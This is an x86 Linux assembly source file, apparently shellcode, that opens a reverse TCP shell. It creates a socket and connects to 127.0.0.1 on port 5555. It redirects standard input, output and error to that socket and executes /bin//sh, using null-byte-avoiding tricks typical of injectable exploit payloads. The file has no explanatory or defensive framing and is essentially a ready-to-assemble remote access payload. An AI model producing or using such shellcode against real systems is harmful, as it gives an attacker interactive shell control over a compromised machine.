global _start 


section .text 

_start: 
	xor ebx, ebx
	mul ebx
	mov al, 0x66
	mov bl, 0x1
	push edx
	push ebx
	push 0x2
	mov ecx, esp
	int 0x80
	mov edi, eax 

	;create address struct
	push edx 
	push edx 
	xor eax, eax 
	mov eax, 0x02010180
	sub eax, 0x01010101
	push eax
	push word 0xb315
	push word 0x2
	mov esi, esp

	;connect 
	xor eax, eax
	xor ebx, ebx
	mov al, 0x66
	mov bl, 0x3
	push 0x10
	push esi
	push edi
	mov ecx, esp
	int 0x80


	;dup input output 
	xor ecx, ecx 
	mov cl, 0x3
	loop:
	xor eax, eax 
	mov al, 0x3f
	mov ebx, edi
	dec cl
	int 0x80
	jnz loop

	;execve
	push edx 
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	push edx 
	push ebx
	mov ecx, esp
	mov al, 0xb
	int 0x80
